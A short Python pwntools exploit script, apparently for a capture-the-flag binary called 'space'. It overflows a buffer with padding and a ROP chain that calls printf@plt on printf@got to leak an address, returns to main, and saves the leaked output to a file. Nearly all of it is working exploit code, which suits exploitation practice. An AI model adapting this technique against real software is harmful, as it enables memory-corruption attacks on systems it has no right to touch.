#!/usr/bin/python

from pwn import *
from time import sleep

p = process("../../bin/pwn2/space")

#gdb.attach(p)
#0x8049192 -> func exec stack

payload = "A"*10	
payload += "B"*8
payload += p32(0x8049040) #printf@plt
payload += p32(0x80491cf) #main
payload += p32(0x804b2d4) #printf@got
print "[+] length of payload : %d" %len(payload) 
print p.recv(1)

p.sendline(payload)	

sleep(2)

msg = p.recv()
with open("abc.txt",'wb') as f:
	f.write(msg)


p.interactive()
